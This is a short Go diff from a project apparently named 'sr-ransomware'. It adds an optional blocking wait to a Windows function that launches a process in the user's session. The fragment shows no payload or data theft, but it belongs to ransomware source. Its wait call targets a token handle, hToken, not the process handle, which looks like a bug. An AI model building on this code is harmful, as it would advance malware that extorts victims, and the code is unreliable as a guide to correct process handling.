@@ -10,7 +10,7 @@ import (
     "github.com/sug0/sr-ransomware/go/errors"
 )
 
-func LaunchProcess(commandLine string) error {
+func LaunchProcess(blocking bool, commandLine string) error {
     sessionID, err := getCurrentSessionID()
     if err != nil {
         return errors.Wrap(pkg, "failed to get session id", err)
@@ -55,8 +55,15 @@ func LaunchProcess(commandLine string) error {
     if err != nil {
         return errors.Wrap(pkg, "failed to create process", err)
     }
-    syscall.CloseHandle(pi.Thread)
-    syscall.CloseHandle(pi.Process)
+    defer syscall.CloseHandle(pi.Process)
+    defer syscall.CloseHandle(pi.Thread)
+
+    if blocking {
+        _, err := syscall.WaitForSingleObject(syscall.Handle(hToken), syscall.INFINITE)
+        if err != nil {
+            return errors.Wrap(pkg, "failed wait for process", err)
+        }
+    }
 
     return nil
 }
